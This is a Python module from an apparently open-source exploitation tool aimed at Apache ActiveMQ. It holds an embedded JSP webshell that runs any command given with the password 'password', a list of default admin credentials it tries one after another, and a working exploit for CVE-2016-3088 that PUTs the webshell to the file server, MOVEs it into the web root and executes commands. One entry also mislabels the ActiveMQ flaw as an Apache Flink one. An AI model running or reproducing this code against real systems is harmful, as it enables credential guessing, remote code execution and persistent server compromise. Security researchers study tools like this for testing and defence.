#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import re
import base64
from thirdparty import requests
from thirdparty.requests.compat import urljoin
import threading
from core.verify import verify
from module import globals
from module.md5 import random_md5
from thirdparty.requests_toolbelt.utils import dump


class ApacheActiveMQ():
    def __init__(self, url):
        self.url = url
        if self.url[-1] == "/":
            self.url = self.url[:-1]
        self.raw_data = None
        self.vul_info = {}
        self.ua = globals.get_value("UA")  # 获取全局变量UA
        self.timeout = globals.get_value("TIMEOUT")  # 获取全局变量UA
        self.headers = globals.get_value("HEADERS")  # 获取全局变量HEADERS
        self.threadLock = threading.Lock()
        self.jsp_webshell = '<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><' \
                            '%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro =' \
                            ' Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInpu' \
                            'tStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\\n");}buf.cl' \
                            'ose();} catch (Exception e) {line.append(e.getMessage());}return line.toString();}%><%if("password".equ' \
                            'als(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCm' \
                            'd(request.getParameter("cmd"))+"</pre>");}else{out.println(":-)");}%>'

    def cve_2015_5254_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Apache AcitveMQ: CVE-2015-5254"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "Apache Flink 反序列化漏洞"
        self.vul_info["vul_numb"] = "CVE-2015-5254"
        self.vul_info["vul_apps"] = "AcitveMQ"
        self.vul_info["vul_date"] = "2015-07-01"
        self.vul_info["vul_vers"] = "< 5.13.0"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "反序列化漏洞"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的" \
                                    "Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。"
        self.vul_info["cre_date"] = "2021-01-07"
        self.vul_info["cre_auth"] = "zhzyker"
        self.passlist = ["admin:123456", "admin:admin", "admin:123123", "admin:activemq", "admin:12345678"]
        self.ver = 5555
        try:
            try:
                for self.pa in self.passlist:
                    self.base64_p = base64.b64encode(str.encode(self.pa))
                    self.p = self.base64_p.decode('utf-8')
                    self.headers_base64 = {
                        'User-Agent': self.ua,
                        'Authorization': 'Basic ' + self.p
                    }
                    self.request = requests.get(self.url + "/admin", headers=self.headers_base64, timeout=self.timeout,
                                                verify=False)
                    self.rawdata = dump.dump_all(self.request).decode('utf-8', 'ignore')
                    if self.request.status_code == 200:
                        self.vul_info["vul_payd"] = self.pa
                        self.get_ver = re.findall("<td><b>(.*)</b></td>", self.request.text)[1]
                        self.ver = self.get_ver.replace(".", "")
                        break
            except IndexError:
                pass
            if int(self.ver) < 5130:
                self.vul_info["vul_data"] = dump.dump_all(self.request).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoC_MaYbE"

                self.vul_info["prt_info"] = "[maybe] [version: " + self.get_ver + "] [version check]"
                verify.scan_print(self.vul_info)
            else:
                verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as e:
            print(e)
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def cve_2016_3088_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Apache AcitveMQ: CVE-2016-3088"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "Apache ActiveMQ 远程代码执行漏洞"
        self.vul_info["vul_numb"] = "CVE-2016-3088"
        self.vul_info["vul_apps"] = "AcitveMQ"
        self.vul_info["vul_date"] = "2016-03-10"
        self.vul_info["vul_vers"] = "< 5.14.0"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "远程代码执行漏洞"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "ActiveMQ 中的 FileServer 服务允许用户通过 HTTP PUT 方法上传文件到指定目录"
        self.vul_info["cre_date"] = "2021-01-07"
        self.vul_info["cre_auth"] = "zhzyker"
        self.rawdata = None
        self.path = "null"
        self.name = random_md5()[:-20]
        self.webshell = "/" + self.name + ".jsp"
        self.poc = random_md5()
        self.exp = self.jsp_webshell
        self.passlist = ["admin:123456", "admin:admin", "admin:123123", "admin:activemq", "admin:12345678"]
        try:
            try:
                for self.pa in self.passlist:
                    self.base64_p = base64.b64encode(str.encode(self.pa))
                    self.p = self.base64_p.decode('utf-8')
                    self.headers_base64 = {
                        'User-Agent': self.ua,
                        'Authorization': 'Basic ' + self.p
                    }
                    url = urljoin(self.url, "/admin/test/systemProperties.jsp")
                    self.request = requests.get(url, headers=self.headers_base64, timeout=self.timeout, verify=False)
                    if self.request.status_code == 200:
                        self.path = \
                            re.findall('<td class="label">activemq.home</td>.*?<td>(.*?)</td>', self.request.text, re.S)[0]
                        break
            except IndexError:
                pass
            self.request = requests.put(self.url + "/fileserver/v.txt", headers=self.headers_base64, data=self.poc,
                                        timeout=self.timeout, verify=False)
            self.headers_move = {
                'User-Agent': self.ua,
                'Destination': 'file://' + self.path + '/webapps/api' + self.webshell
            }
            self.request = requests.request("MOVE", self.url + "/fileserver/v.txt", headers=self.headers_move,
                                            timeout=self.timeout, verify=False)
            self.request = requests.get(self.url + "/api" + self.webshell, headers=self.headers_base64,
                                        timeout=self.timeout, verify=False)
            if self.poc in self.request.text:
                self.vul_info["vul_data"] = dump.dump_all(self.request).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["vul_payd"] = 'file://' + self.path + '/webapps/api' + self.webshell
                self.vul_info["prt_info"] = "[upload: " + self.url + "/api" + self.webshell + " ] [" + self.pa + "]"
                verify.scan_print(self.vul_info)
            else:
                verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as e:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()
        
    def cve_2016_3088_exp(self, cmd):
        self.threadLock.acquire()
        vul_name = "Apache AcitveMQ: CVE-2016-3088"
        self.path = "null"
        self.name = random_md5()
        self.webshell = "/" + self.name + ".jsp"
        self.exp = self.jsp_webshell
        self.passlist = ["admin:123456", "admin:admin", "admin:123123", "admin:activemq", "admin:12345678"]
        try:
            for self.pa in self.passlist:
                self.base64_p = base64.b64encode(str.encode(self.pa))
                self.p = self.base64_p.decode('utf-8')
                self.headers_base64 = {
                    'User-Agent': self.ua,
                    'Authorization': 'Basic ' + self.p
                }
                url = urljoin(self.url, "/admin/test/systemProperties.jsp")
                self.request = requests.get(url, headers=self.headers_base64, timeout=self.timeout, verify=False)
                if self.request.status_code == 200:
                    self.path = \
                        re.findall('<td class="label">activemq.home</td>.*?<td>(.*?)</td>', self.request.text, re.S)[0]
                    break
            self.request = requests.put(self.url + "/fileserver/v.txt", headers=self.headers_base64, data=self.exp,
                                        timeout=self.timeout, verify=False)
            self.headers_move = {
                'User-Agent': self.ua,
                'Destination': 'file://' + self.path + '/webapps/api' + self.webshell
            }
            self.request = requests.request("MOVE", self.url + "/fileserver/v.txt", headers=self.headers_move,
                                            timeout=self.timeout, verify=False)
            self.raw_data = dump.dump_all(self.request).decode('utf-8', 'ignore')
            self.request = requests.get(self.url + "/api" + self.webshell + "?pwd=password&cmd=" + cmd,
                                        headers=self.headers_base64,
                                        timeout=self.timeout, verify=False)
            self.r = "[webshell: " + self.url + "/api" + self.webshell + "?pwd=password&cmd=" + cmd + " ]\n"
            self.r += self.request.text
            verify.exploit_print(self.r, self.raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception:
            verify.error_print(vul_name)
